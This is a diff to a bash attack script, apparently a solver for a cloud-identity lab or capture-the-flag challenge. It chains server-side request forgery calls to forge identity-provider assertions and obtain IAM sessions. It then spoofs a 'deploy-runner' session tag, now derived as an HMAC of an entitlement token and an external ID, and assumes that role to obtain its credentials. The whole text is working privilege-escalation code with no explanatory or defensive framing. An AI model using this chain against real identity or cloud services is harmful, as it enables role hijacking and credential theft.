@@ -57,7 +57,8 @@ a0="$(ssrf "$IDP/idp/assert?p=$(p_assert "$ent" cloud-operator)" | jkey assertio
 sess0="$(ssrf "$IAM/iam/session?assertion=${a0}" | jkey session)"
 desc="$(ssrf "$IAM/iam/describe?session=${sess0}")"
 tag="$(printf '%s' "$desc" | python3 -c 'import sys,json;c=json.load(sys.stdin)["principals"]["deploy-runner"]["trust_policy"]["Condition"]["StringEquals"];print(next(iter(c)).split("/")[-1])')"
-tagval="$(printf '%s' "$desc" | python3 -c 'import sys,json;c=json.load(sys.stdin)["principals"]["deploy-runner"]["trust_policy"]["Condition"]["StringEquals"];print(next(iter(c.values())))')"
+# the value is DERIVED: HMAC(entitlement token, external_id)[:16] (combine two evidence pieces)
+tagval="$(printf '%s' "$desc" | python3 -c 'import sys,json,hmac,hashlib;xid=json.load(sys.stdin)["session_tag_source"]["external_id"];print(hmac.new(sys.argv[1].encode(),xid.encode(),hashlib.sha256).hexdigest()[:16])' "$ent")"
 a1="$(ssrf "$IDP/idp/assert?p=$(p_tag "$ent" "$tag" "$tagval")" | jkey assertion)"
 sess1="$(ssrf "$IAM/iam/session?assertion=${a1}" | jkey session)"
 dr="$(ssrf "$IAM/iam/assume?p=$(p_assume "$sess1" deploy-runner)" | jkey role_credential)"
